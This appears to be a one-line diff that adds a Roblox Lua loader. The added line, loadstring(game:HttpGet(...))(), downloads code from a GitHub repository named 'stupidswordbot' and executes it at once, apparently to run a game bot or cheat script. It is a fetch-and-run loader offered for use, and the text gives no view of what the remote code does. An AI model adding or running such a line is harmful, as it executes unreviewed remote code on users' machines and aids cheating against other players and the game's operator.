@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/smile3911/stupidswordbot/main/load"))()
